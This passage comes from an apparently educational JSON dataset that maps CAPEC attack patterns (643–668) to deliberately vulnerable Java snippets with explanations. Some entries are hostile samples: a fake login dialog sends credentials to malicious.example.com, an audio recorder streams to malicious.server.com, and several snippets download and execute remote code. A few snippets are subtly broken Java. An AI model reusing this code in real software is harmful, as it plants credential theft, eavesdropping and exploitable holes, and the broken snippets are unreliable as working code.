        "description": "This vulnerable code demonstrates improper file permissions management and unsafe binary execution. It creates executable files with world-writable permissions in a predictable location, allowing malicious actors to replace the binaries. The code also uses unvalidated input for execution and places files in a directory with spaces without proper quoting, making it susceptible to search path attacks. The cleanup process is inadequate, leaving opportunities for binary replacement attacks."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "public class FileSystemScanner {\n    private static final String SHARED_PATH = \"\\\\\\\\networkshare\\\\public\";\n\n    public static List<String> listSharedFiles(String searchPath) {\n        List<String> files = new ArrayList<>();\n        try {\n            String userInput = searchPath != null ? searchPath : SHARED_PATH;\n            File directory = new File(userInput);\n            if (directory.exists()) {\n                for (File file : directory.listFiles()) {\n                    files.add(file.getAbsolutePath());\n                    if (file.isDirectory()) {\n                        files.addAll(listSharedFiles(file.getPath()));\n                    }\n                }\n            }\n            return files;\n        } catch (Exception e) {\n            return files;\n        }\n    }\n\n    public static void shareDirectory(String directoryPath) {\n        File directory = new File(directoryPath);\n        if (directory.exists()) {\n            directory.setReadable(true, false);\n            directory.setExecutable(true, false);\n        }\n    }\n}",
        "description": "This vulnerable code allows unrestricted access to network shares and directory traversal. It recursively lists all files in a given directory without proper access control checks, accepts user input for paths without validation, and sets directories as globally readable. The code exposes sensitive file system information and allows access to potentially restricted network locations through UNC paths."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "public class WindowsDomainAuth {\n    private static final String STORED_HASH = \"5f4dcc3b5aa765d61d8327deb882cf99\";\n    \n    public static boolean authenticateUser(String username, String passwordHash) {\n        // Vulnerable: directly comparing password hashes\n        if (passwordHash.equals(STORED_HASH)) {\n            // Impersonation using Windows credentials\n            try {\n                WindowsIdentity identity = WindowsIdentity.getCurrentIdentity();\n                WindowsImpersonationContext context = identity.impersonate();\n                \n                // Perform privileged operations\n                executePrivilegedAction();\n                \n                return true;\n            } catch (Exception e) {\n                return false;\n            }\n        }\n        return false;\n    }\n    \n    private static void executePrivilegedAction() {\n        // Access domain resources with impersonated credentials\n        File domainResource = new File(\"\\\\\\\\domain\\\\share\\\\resource.txt\");\n    }\n}",
        "description": "This code demonstrates vulnerable Windows domain authentication by storing and comparing password hashes directly, implementing single-factor authentication, and using Windows impersonation. It's susceptible to pass-the-hash attacks, replay attacks, and potentially dangerous privilege escalation through impersonation. The code stores password hashes in plaintext and compares them directly, making it vulnerable to hash capture and replay attacks in Windows domain environments."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "public class KerberosAuthenticator {\n    private static byte[] storedTicket;\n\n    public static boolean authenticate(byte[] receivedTicket) {\n        // Vulnerable: No ticket validation or expiration check\n        if (receivedTicket != null) {\n            storedTicket = receivedTicket;\n            return true;\n        }\n        return false;\n    }\n\n    public static boolean accessResource(byte[] presentedTicket) {\n        // Vulnerable: Simple byte comparison without cryptographic validation\n        // or timestamp checking, allowing replay attacks\n        if (Arrays.equals(presentedTicket, storedTicket)) {\n            grantAccess();\n            return true;\n        }\n        return false;\n    }\n\n    private static void grantAccess() {\n        // Grant system access based on replayed ticket\n        System.out.println(\"Access granted\");\n    }\n}",
        "description": "This code demonstrates a vulnerable Kerberos-style authentication implementation that stores tickets insecurely and is susceptible to replay attacks. It lacks proper ticket validation, encryption, and expiration checking, allowing captured tickets to be replayed. The system uses single-factor authentication and performs no entity verification, making it vulnerable to unauthorized access through stolen or replayed tickets."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "public class DeviceMonitor {\n    private static final String REGISTRY_PATH = \"SYSTEM\\\\CurrentControlSet\\\\Enum\\\\USB\";\n    \n    public static void logDeviceInfo() throws Exception {\n        String userHome = System.getProperty(\"user.home\");\n        File backupDir = new File(userHome + \"/DeviceBackups\");\n        \n        // Store all device information in plaintext\n        FileWriter writer = new FileWriter(\"device_info.txt\");\n        \n        // Expose system information without access control\n        Runtime runtime = Runtime.getRuntime();\n        Process process = runtime.exec(\"reg query \" + REGISTRY_PATH);\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        \n        String line;\n        while((line = reader.readLine()) != null) {\n            writer.write(line + \"\\n\");\n            if(line.contains(\"VID_\") || line.contains(\"PID_\")) {\n                // Log all USB device identifiers\n                System.out.println(\"Found device: \" + line);\n            }\n        }\n        \n        // Search for iOS backups without verification\n        if(backupDir.exists()) {\n            for(File file : backupDir.listFiles()) {\n                writer.write(\"iOS Backup found: \" + file.getAbsolutePath() + \"\\n\");\n            }\n        }\n        \n        writer.close();\n    }\n}",
        "description": "This vulnerable code demonstrates the exposure of sensitive device information by querying the Windows registry for USB devices and searching for iOS backups. It stores the collected information in plaintext files without access controls, exposes system-level information through direct registry access, and doesn't validate device names or paths. The code creates information disclosure vulnerabilities by logging sensitive device details and system information that could be exploited by unauthorized actors."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "public class RegistryManager {\n    private static final String REG_PATH = \"SOFTWARE\\\\MyApp\";\n    \n    public static void storeCredentials(String username, String password) {\n        try {\n            // Store sensitive data directly in registry without encryption\n            WinRegistry.writeStringValue(\n                WinRegistry.HKEY_LOCAL_MACHINE,\n                REG_PATH,\n                \"username\",\n                username\n            );\n            WinRegistry.writeStringValue(\n                WinRegistry.HKEY_LOCAL_MACHINE,\n                REG_PATH,\n                \"password\",\n                password\n            );\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public static String[] getCredentials() {\n        try {\n            // No authorization check before accessing sensitive data\n            String username = WinRegistry.readString(\n                WinRegistry.HKEY_LOCAL_MACHINE,\n                REG_PATH,\n                \"username\"\n            );\n            String password = WinRegistry.readString(\n                WinRegistry.HKEY_LOCAL_MACHINE,\n                REG_PATH,\n                \"password\"\n            );\n            return new String[]{username, password};\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates storing sensitive credentials in the Windows Registry in cleartext and accessing them without proper authorization checks. Any user or process can potentially read these values, exposing sensitive system information. The code lacks encryption for stored data and proper access control mechanisms, making it susceptible to unauthorized access and information disclosure."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "public class ScreenCaptureUtil {\n    private static final String SCREENSHOT_PATH = \"/tmp/screenshots/\";\n    \n    public static void captureLoginScreen() {\n        try {\n            Robot robot = new Robot();\n            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());\n            BufferedImage screenCapture = robot.createScreenCapture(screenRect);\n            \n            // Store sensitive screen capture with weak permissions\n            File outputFile = new File(SCREENSHOT_PATH + \"login_\" + System.currentTimeMillis() + \".png\");\n            outputFile.getParentFile().mkdirs();\n            ImageIO.write(screenCapture, \"png\", outputFile);\n            \n            // Send screenshot over unencrypted connection\n            URL url = new URL(\"http://logging-server.com/upload\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setDoOutput(true);\n            Files.copy(outputFile.toPath(), conn.getOutputStream());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code captures screenshots during login operations and stores them insecurely. It exhibits multiple vulnerabilities: storing sensitive screenshots in a world-readable directory, transmitting them over an unencrypted connection, and lacking proper access controls. The code could allow unauthorized users to access login credentials and sensitive information through captured screenshots."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "public class FileValidator {\n    public static boolean validateAndProcessFile(String fileName) {\n        // Vulnerable file processing due to lack of proper filename validation\n        if (fileName.toLowerCase().endsWith(\".txt\")) {\n            try {\n                // Process text file without validating for trailing spaces\n                File file = new File(fileName);\n                ProcessBuilder pb = new ProcessBuilder(\"notepad.exe\", file.getPath());\n                pb.start();\n                return true;\n            } catch (Exception e) {\n                return false;\n            }\n        } else if (fileName.toLowerCase().endsWith(\".exe \")) {  // Note the trailing space\n            try {\n                // Dangerous: executes file even with trailing space\n                Runtime.getRuntime().exec(fileName);\n                return true;\n            } catch (Exception e) {\n                return false;\n            }\n        }\n        return false;\n    }\n}",
        "description": "This vulnerable code demonstrates improper validation of file extensions with trailing spaces. The code processes files based on their extensions without properly sanitizing or normalizing the filenames. An attacker could exploit this by naming a malicious executable as 'malware.exe ' (with a trailing space) to bypass the intended extension checks and trigger unexpected program behavior. The code also fails to consider Windows 8.3 filename equivalence and other path equivalence issues."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "public class FileUploadServlet extends HttpServlet {\n    private static final String UPLOAD_DIRECTORY = \"/var/www/html/uploads/\";\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\");\n        String fileName = filePart.getSubmittedFileName();\n        \n        // No authentication check\n        // No file type validation\n        // No permission verification\n        \n        String filePath = UPLOAD_DIRECTORY + fileName;\n        File uploadDir = new File(UPLOAD_DIRECTORY);\n        if (!uploadDir.exists()) {\n            uploadDir.mkdir();\n        }\n\n        filePart.write(filePath);\n        // File becomes accessible via web server\n        response.getWriter().println(\"File uploaded successfully to \" + filePath);\n    }\n}",
        "description": "This vulnerable code allows unrestricted file uploads without authentication, file type validation, or proper permissions checking. It saves uploaded files to a web-accessible directory, potentially allowing malicious files like web shells to be uploaded and executed with web server privileges."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "public class SensitiveDataRecorder {\n    private AudioInputStream audioStream;\n    private FileOutputStream fileOutput;\n\n    public void startRecording() throws Exception {\n        AudioFormat format = new AudioFormat(44100, 16, 1, true, true);\n        DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);\n        TargetDataLine microphone = (TargetDataLine) AudioSystem.getLine(info);\n        microphone.open(format);\n        microphone.start();\n\n        audioStream = new AudioInputStream(microphone);\n        fileOutput = new FileOutputStream(\"recorded_conversation.wav\");\n\n        byte[] buffer = new byte[4096];\n        int bytesRead;\n\n        while ((bytesRead = audioStream.read(buffer)) != -1) {\n            fileOutput.write(buffer, 0, bytesRead);\n            // Store sensitive audio data in cleartext\n            sendToRemoteServer(buffer);\n        }\n    }\n\n    private void sendToRemoteServer(byte[] data) {\n        try {\n            Socket socket = new Socket(\"malicious.server.com\", 12345);\n            OutputStream out = socket.getOutputStream();\n            out.write(data);\n            out.close();\n            socket.close();\n        } catch (Exception e) {\n            // Silently fail to avoid detection\n        }\n    }\n}",
        "description": "This code implements an audio eavesdropping system that records conversations through the microphone and transmits the data in cleartext to a remote server. It demonstrates multiple vulnerabilities: unauthorized recording of sensitive information (CWE-200), cleartext transmission of sensitive data (CWE-319), and creates a covert channel for data exfiltration (CWE-514, CWE-515). The code also lacks protection against physical side-channel analysis (CWE-1300) as it processes and transmits raw audio data without encryption or obfuscation."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "public class AuthenticationService {\n    private static final String KERBEROS_TICKET = \"TGT_TICKET_DATA\";\n    private static Map<String, String> storedCredentials = new HashMap<>();\n    \n    public boolean authenticateUser(String username, String password) {\n        // Store credentials in plain text\n        storedCredentials.put(username, password);\n        \n        // No rate limiting on authentication attempts\n        if (validateKerberosTicket(KERBEROS_TICKET)) {\n            return true;\n        }\n        \n        return false;\n    }\n    \n    private boolean validateKerberosTicket(String ticket) {\n        // Vulnerable ticket validation - no timestamp or replay protection\n        return ticket.startsWith(\"TGT\");\n    }\n    \n    public String getStoredCredential(String username) {\n        // Directly expose stored credentials\n        return storedCredentials.get(username);\n    }\n}",
        "description": "This vulnerable code demonstrates insecure handling of Kerberos credentials and authentication. It stores credentials in plaintext, lacks protection against replay attacks, implements no rate limiting for authentication attempts, uses single-factor authentication, and provides direct access to stored credentials. The ticket validation is simplistic and doesn't check for ticket expiration or replay protection, making it susceptible to capture-replay attacks."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "public class AuthenticationSystem {\n    private static final int MAX_PASSWORD_AGE_DAYS = 365; // Too long password expiration\n    private Map<String, String> userCredentials = new HashMap<>();\n    \n    public boolean authenticate(String username, String password) {\n        // Store credentials in plain text\n        userCredentials.put(\"admin\", \"admin123\");\n        userCredentials.put(\"user\", \"password123\");\n        \n        // No brute force protection\n        // Single factor authentication only\n        if (userCredentials.containsKey(username)) {\n            return userCredentials.get(username).equals(password);\n        }\n        return false;\n    }\n    \n    public void changePassword(String username, String newPassword) {\n        // No password complexity requirements\n        // No check for password history\n        // No enforcement of password expiration\n        userCredentials.put(username, newPassword);\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including storage of credentials in plain text, lack of brute force protection, single-factor authentication, weak password policies, no password aging mechanism, and overly simple password validation. The system stores credentials in memory without encryption and performs direct string comparison for authentication, making it susceptible to credential theft and unauthorized access."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "public class FakeLoginPrompt extends JDialog {\n    private JTextField usernameField;\n    private JPasswordField passwordField;\n    private static final String HARDCODED_SERVER = \"malicious.example.com\";\n    private static final String HARDCODED_CREDS = \"defaultKey123\";\n\n    public FakeLoginPrompt() {\n        setTitle(\"System Security Update\");\n        setLayout(new GridLayout(3, 2));\n        \n        usernameField = new JTextField();\n        passwordField = new JPasswordField();\n        \n        add(new JLabel(\"Username:\"));\n        add(usernameField);\n        add(new JLabel(\"Password:\"));\n        add(passwordField);\n        \n        JButton submitButton = new JButton(\"Login\");\n        submitButton.addActionListener(e -> {\n            String username = usernameField.getText();\n            String password = new String(passwordField.getPassword());\n            \n            try {\n                URL url = new URL(\"http://\" + HARDCODED_SERVER + \"/collect\");\n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n                conn.setRequestMethod(\"POST\");\n                String credentials = username + \":\" + password;\n                conn.setRequestProperty(\"Authorization\", \"Basic \" + \n                    Base64.getEncoder().encodeToString(credentials.getBytes()));\n                conn.getInputStream();\n            } catch (Exception ex) {\n                // Silently fail to avoid detection\n            }\n        });\n        add(submitButton);\n        \n        setAlwaysOnTop(true);\n        setSize(300, 150);\n        setLocationRelativeTo(null);\n    }\n}",
        "description": "A malicious Java application that creates a fake login dialog mimicking a system prompt. It uses hard-coded credentials for its server communication, stores credentials insecurely, and transmits them over an unencrypted connection. The dialog is set to always stay on top to maximize chances of credential theft."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "public class FileUploadProcessor {\n    private static final String TEMP_DIR = \"/tmp/\";\n    private static final Logger logger = Logger.getLogger(FileUploadProcessor.class.getName());\n\n    public void processUploadedFile(String fileName, byte[] fileData) {\n        try {\n            // Store file in temporary directory without validation\n            String tempPath = TEMP_DIR + fileName;\n            FileOutputStream fos = new FileOutputStream(tempPath);\n            fos.write(fileData);\n            fos.close();\n\n            // Log sensitive file details\n            logger.info(\"New file uploaded: \" + fileName + \", size: \" + fileData.length + \n                       \", user: \" + System.getProperty(\"user.name\") + \n                       \", path: \" + tempPath);\n\n            // Process file based only on extension\n            if(fileName.endsWith(\".txt\")) {\n                processTextFile(tempPath);\n            } else if(fileName.endsWith(\".exe\")) {\n                processExecutable(tempPath);\n            }\n        } catch(IOException e) {\n            logger.severe(\"Error processing file: \" + e.getMessage());\n        }\n    }\n\n    private void processTextFile(String path) {\n        // Process text file\n    }\n\n    private void processExecutable(String path) {\n        // Process executable file\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: it accepts files without proper validation, stores them in a predictable temporary directory, logs sensitive information, and determines file processing based solely on file extension. The code allows unrestricted file uploads and can be exploited by uploading files with manipulated sizes or dangerous types, while also exposing sensitive information through logging."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "public class PhoneAuthenticationSystem {\n    private Map<String, String> userCredentials = new HashMap<>();\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n\n    public boolean authenticateUser(String phoneNumber, String userId) {\n        // No verification of caller ID or phone number authenticity\n        String storedCredentials = userCredentials.get(userId);\n        \n        // Store sensitive information in plaintext\n        String userSensitiveInfo = \"SSN:123-45-6789;DOB:01/01/1980\";\n        \n        // No rate limiting on authentication attempts\n        if (loginAttempts.containsKey(userId)) {\n            loginAttempts.put(userId, loginAttempts.get(userId) + 1);\n        } else {\n            loginAttempts.put(userId, 1);\n        }\n\n        // Expose sensitive information over unsecured channel\n        if (storedCredentials != null) {\n            System.out.println(\"User information: \" + userSensitiveInfo);\n            return true;\n        }\n        return false;\n    }\n\n    public void resetPassword(String phoneNumber, String userId) {\n        // No verification of caller identity\n        // Immediately reset password without additional verification\n        String newPassword = \"tempPass123\";\n        userCredentials.put(userId, newPassword);\n        System.out.println(\"New password: \" + newPassword);\n    }\n}",
        "description": "This vulnerable code demonstrates a phone-based authentication system that fails to properly verify the source of incoming calls, doesn't limit authentication attempts, stores and transmits sensitive information insecurely, and exposes personal information without proper authorization checks. The system accepts phone numbers at face value without verification, making it susceptible to spoofing and social engineering attacks."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "public class AutoUpdateManager {\n    private String updateServerUrl;\n\n    public AutoUpdateManager(String serverUrl) {\n        this.updateServerUrl = serverUrl;\n    }\n\n    public void checkForUpdates() {\n        try {\n            URL url = new URL(updateServerUrl + \"/latest-version.xml\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(conn.getInputStream()));\n            \n            String updateInfo = reader.readLine();\n            if (updateInfo.contains(\"newVersion\")) {\n                downloadAndInstallUpdate(updateInfo);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void downloadAndInstallUpdate(String updateInfo) {\n        try {\n            String downloadUrl = extractDownloadUrl(updateInfo);\n            URL url = new URL(downloadUrl);\n            InputStream in = url.openStream();\n            File updateFile = new File(\"update.jar\");\n            FileOutputStream out = new FileOutputStream(updateFile);\n            \n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            \n            // Execute the downloaded update without verification\n            Runtime.getRuntime().exec(\"java -jar update.jar\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private String extractDownloadUrl(String updateInfo) {\n        return updateInfo.split(\"url=\")[1];\n    }\n}",
        "description": "This code demonstrates a vulnerable auto-update implementation that downloads and executes updates without proper verification. It accepts an update server URL without validation, doesn't verify the authenticity of the update source, performs no integrity checks on downloaded files, and executes downloaded code without verification. The code is vulnerable to spoofing attacks where an attacker could intercept the update check and serve malicious updates that would be automatically executed."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "public class RootDetectionBypass {\n    static {\n        System.loadLibrary(\"untrusted_library\");\n    }\n\n    public class CustomURLHandler {\n        public void handleURL(String url) {\n            if(url.startsWith(\"myapp://\")) {\n                String command = url.substring(8);\n                executeCommand(command);\n            }\n        }\n    }\n\n    private native boolean isDeviceRooted();\n\n    public void checkRoot() {\n        try {\n            String libPath = downloadLibrary(\"http://untrusted-source.com/lib.so\");\n            System.load(libPath);\n            \n            Runtime runtime = Runtime.getRuntime();\n            Process proc = runtime.exec(\"su -c \\\"\" + \n                \"getprop ro.debuggable\" + \"\\\"\");\n            \n            if(!isDeviceRooted()) {\n                // Bypassed root detection\n                String systemInfo = getSystemInfo();\n                sendToServer(systemInfo);\n            }\n        } catch(Exception e) {}\n    }\n\n    private String downloadLibrary(String url) {\n        // Downloads library without verification\n        return \"path/to/downloaded/library\";\n    }\n\n    private void executeCommand(String cmd) {\n        try {\n            Runtime.getRuntime().exec(cmd);\n        } catch(Exception e) {}\n    }\n\n    private String getSystemInfo() {\n        return System.getProperty(\"os.version\") + \n               System.getProperty(\"user.name\") + \n               System.getProperty(\"java.home\");\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues related to root detection bypass. It loads untrusted native libraries, handles custom URLs without proper validation, executes OS commands with unvalidated input, exposes sensitive system information, and downloads code without integrity checks. The code attempts to detect root access but can be bypassed through hooking the native method 'isDeviceRooted'. It also includes unsafe command execution and system information exposure."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "public class DebuggerVulnerableApp {\n    private static final String SENSITIVE_KEY = \"s3cr3t_k3y_123\";\n    private static boolean isDebuggable = true;\n    \n    public static void main(String[] args) {\n        if (!checkForRootJailbreak()) {\n            // Debug mode enabled for development\n            Debug.waitForDebugger();\n            \n            // Store sensitive info in plaintext\n            String userCredentials = \"admin:password123\";\n            System.out.println(\"Debug: \" + userCredentials);\n            \n            // Expose system information\n            System.out.println(\"System Path: \" + System.getProperty(\"java.library.path\"));\n            System.out.println(\"Debug Key: \" + SENSITIVE_KEY);\n            \n            performSensitiveOperation();\n        }\n    }\n    \n    private static boolean checkForRootJailbreak() {\n        // Weak root detection that can be bypassed with debugger\n        return false;\n    }\n    \n    private static void performSensitiveOperation() {\n        // Debug trace enabled\n        if (isDebuggable) {\n            System.out.println(\"Executing sensitive operation...\");\n            // Sensitive operation code here\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable mobile application that contains active debug code, weak root/jailbreak detection, and exposed sensitive information. The code includes debug flags that are left enabled, plaintext credentials, exposed system paths, and insufficient protection against debugging. An attacker can easily attach a debugger to bypass the root detection and access sensitive information."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "public class WebBrowserClient {\n    private String serverURL = \"http://malicious-server.com\";\n    \n    public void downloadAndExecuteUpdate() {\n        try {\n            URL url = new URL(serverURL + \"/update.jar\");\n            URLConnection conn = url.openConnection();\n            \n            // Download code without verification\n            InputStream in = conn.getInputStream();\n            File tempFile = File.createTempFile(\"update\", \".jar\");\n            \n            FileOutputStream out = new FileOutputStream(tempFile);\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            \n            // Execute downloaded code without integrity check\n            URLClassLoader classLoader = new URLClassLoader(\n                new URL[] { tempFile.toURI().toURL() }\n            );\n            Class<?> loadedClass = classLoader.loadClass(\"UpdateModule\");\n            loadedClass.getMethod(\"execute\").invoke(null);\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a web browser client that downloads and executes code from a remote server without proper verification of the source or integrity checks. It allows for potential man-in-the-middle attacks, execution of malicious code, and relies solely on client-side security. The code uses a non-secure connection and implements no authentication or validation mechanisms, making it susceptible to various attacks including code injection and unauthorized access."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "public class SecretDataAccess {\n    private static final int CACHE_LINE_SIZE = 64;\n    private byte[] secretData = \"SENSITIVE_PASSWORD\".getBytes();\n    \n    public void accessData(int index) {\n        // Intentionally vulnerable speculative execution pattern\n        byte[] probe = new byte[256 * CACHE_LINE_SIZE];\n        \n        if (index < secretData.length) {  // bounds check might be speculatively bypassed\n            // Speculative execution might leak data through cache timing\n            int value = secretData[index] & 0xFF;\n            probe[value * CACHE_LINE_SIZE] = 1;  // Cache line access based on secret\n        }\n        \n        // Attacker can measure access times to determine which cache line was accessed\n        for (int i = 0; i < 256; i++) {\n            long start = System.nanoTime();\n            probe[i * CACHE_LINE_SIZE];\n            long time = System.nanoTime() - start;\n            // Fast access time indicates cache hit, revealing secret value\n        }\n    }\n}",
        "description": "This code demonstrates a Spectre-style vulnerability where speculative execution can leak sensitive data through cache timing side channels. The code includes an array bounds check that could be speculatively bypassed, allowing secret data access during transient execution. The secret value is used to index into a probe array, creating cache-timing differences that can be measured by an attacker to extract the secret data."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "public class ImageFetcher {\n    public byte[] fetchImage(String imageUrl) {\n        try {\n            URL url = new URL(imageUrl);\n            URLConnection conn = url.openConnection();\n            return conn.getInputStream().readAllBytes();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    public String getInternalDocument(String docId) {\n        // User-supplied input directly used in internal request\n        String internalUrl = \"http://internal-server/docs?id=\" + docId;\n        try {\n            URL url = new URL(internalUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(conn.getInputStream())\n            );\n            return reader.readLine();\n        } catch (Exception e) {\n            return \"Error fetching document\";\n        }\n    }\n}",
        "description": "This vulnerable code allows Server-Side Request Forgery (SSRF) by failing to validate user input URLs. The code blindly accepts and processes URLs without checking if they point to internal resources or malicious endpoints. An attacker could provide URLs pointing to internal services or localhost to access restricted resources. The getInternalDocument method is particularly vulnerable as it allows direct manipulation of internal URLs through the docId parameter."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "public class ThunderboltController {\n    private boolean isAuthenticated = false;\n    private static final String DEFAULT_FIRMWARE_KEY = \"1234567890\";\n    \n    public boolean initializeDevice(byte[] deviceId) {\n        // Vulnerable: No verification of device authenticity\n        return true;\n    }\n    \n    public boolean authenticateDevice(String authToken) {\n        // Vulnerable: Simple token comparison without proper verification\n        if(authToken.equals(DEFAULT_FIRMWARE_KEY)) {\n            isAuthenticated = true;\n            return true;\n        }\n        return false;\n    }\n    \n    public byte[] readMemory(int address, int size) {\n        // Vulnerable: No authorization check for memory access\n        byte[] data = new byte[size];\n        // Simulated memory read without verification\n        return data;\n    }\n    \n    public boolean updateFirmware(byte[] newFirmware) {\n        // Vulnerable: No integrity check on firmware update\n        // No verification of firmware source\n        if(newFirmware != null) {\n            // Direct firmware update without validation\n            return true;\n        }\n        return false;\n    }\n}",
        "description": "This code demonstrates vulnerable Thunderbolt controller implementation with multiple security issues: missing authentication verification, weak authorization checks, lack of firmware integrity validation, and insecure default configurations. The code allows unauthorized memory access, accepts unverified firmware updates, and uses a hardcoded default key for authentication."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "public class VulnerableBluetooth {\n    private static BluetoothSocket socket;\n    private static OutputStream outStream;\n\n    public static void initializeBluetoothConnection() {\n        try {\n            BluetoothDevice device = null;\n            // Direct socket creation without proper resource management\n            socket = device.createRfcommSocketToServiceRecord(UUID.randomUUID());\n            socket.connect();\n            outStream = socket.getOutputStream();\n\n            // Sending sensitive data in cleartext without message integrity check\n            while (true) {\n                String sensitiveData = \"user_credentials_123\";\n                byte[] buffer = sensitiveData.getBytes();\n                // Large packet flooding without rate limiting\n                for (int i = 0; i < 1000; i++) {\n                    outStream.write(buffer);\n                    outStream.flush();\n                }\n            }\n        } catch (IOException e) {\n            // Resources not properly released in case of exception\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable Bluetooth communication by creating direct socket connections without proper resource management, transmitting sensitive data in cleartext, and enabling packet flooding through unlimited data transmission. The code lacks proper connection cleanup, message integrity checks, and rate limiting mechanisms, making it susceptible to DoS attacks and data interception."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "public class BluetoothConnectionManager {\n    private static final Map<String, Boolean> trustedDevices = new HashMap<>();\n    \n    public boolean authenticateDevice(String macAddress) {\n        // Vulnerable: Only checks MAC address without additional verification\n        return trustedDevices.containsKey(macAddress);\n    }\n    \n    public void handleConnection(BluetoothDevice device) {\n        String macAddress = device.getAddress();\n        \n        // Vulnerable: No verification of MAC address authenticity\n        if (authenticateDevice(macAddress)) {\n            // Grant full access to device\n            grantAccess(device);\n        }\n    }\n    \n    public void addTrustedDevice(String macAddress) {\n        // Vulnerable: Stores MAC address without additional security measures\n        trustedDevices.put(macAddress, true);\n    }\n    \n    private void grantAccess(BluetoothDevice device) {\n        // Perform privileged operations\n    }\n}",
        "description": "This code demonstrates vulnerable Bluetooth authentication that relies solely on MAC address verification. It lacks proper validation of the device's authenticity and is susceptible to MAC address spoofing attacks. The authentication mechanism doesn't implement any additional security measures or challenge-response protocols, making it easy for an attacker to impersonate a trusted device by simply spoofing its MAC address."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "public class BluetoothPairing {\n    private static final int DEFAULT_ENTROPY_BITS = 4;\n    \n    public boolean pairDevices(BluetoothDevice device1, BluetoothDevice device2) {\n        // Weak entropy bits negotiation\n        int entropyBits = negotiateEntropyBits(device1, device2);\n        \n        // Generate weak pairing key\n        byte[] pairingKey = generatePairingKey(entropyBits);\n        \n        // Insecure key exchange without validation\n        boolean success = exchangeKeys(device1, device2, pairingKey);\n        \n        if (success) {\n            establishConnection(device1, device2, pairingKey);\n            return true;\n        }\n        return false;\n    }\n    \n    private int negotiateEntropyBits(BluetoothDevice device1, BluetoothDevice device2) {\n        // Always accepts lowest proposed entropy bits without validation\n        return DEFAULT_ENTROPY_BITS;\n    }\n    \n    private byte[] generatePairingKey(int entropyBits) {\n        // Generates weak key using minimal entropy\n        byte[] key = new byte[entropyBits];\n        // Use predictable random number generator\n        Random rand = new Random();\n        rand.nextBytes(key);\n        return key;\n    }\n    \n    private boolean exchangeKeys(BluetoothDevice device1, BluetoothDevice device2, byte[] key) {\n        // No validation of key exchange messages\n        // No protection against MITM attacks\n        return true;\n    }\n}",
